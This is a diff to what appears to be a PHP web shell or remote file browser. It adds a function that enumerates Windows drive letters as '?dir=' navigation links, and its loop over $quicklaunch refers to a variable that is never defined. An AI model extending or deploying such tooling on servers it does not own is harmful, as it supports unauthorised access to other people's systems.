@@ -606,6 +606,39 @@ function color($bold = 1, $colorid = null, $string = null) {
 function OS() {
 	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
 }
+function windisk() {
+	$letters = "";
+	$v = explode("\\", path());
+	$v = $v[0];
+	 foreach(range("A", "Z") as $letter) {
+	  	$bool = $isdiskette = in_array($letter, array("A"));
+	  	if(!$bool) $bool = is_dir("$letter:\\");
+	  	if($bool) {
+	   		$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
+	   		if($letter.":" != $v) {
+	   			$letters .= $letter;
+	   		}
+	   		else {
+	   			$letters .= color(1, 2, $letter);
+	   		}
+	   		$letters .= "</a> ]";
+	  	}
+	}
+	if(!empty($letters)) {
+		print "Detected Drives $letters<br>";
+	}
+	if(count($quicklaunch) > 0) {
+		foreach($quicklaunch as $item) {
+	  		$v = realpath(path(). "..");
+	  		if(empty($v)) {
+	  			$a = explode(DIRECTORY_SEPARATOR,path());
+	  			unset($a[count($a)-2]);
+	  			$v = join(DIRECTORY_SEPARATOR, $a);
+	  		}
+	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
+		}
+	}
+}
 function w($dir,$perm) {
 	if(!is_writable($dir)) {
 		return "<font color=red>".$perm."</font>";
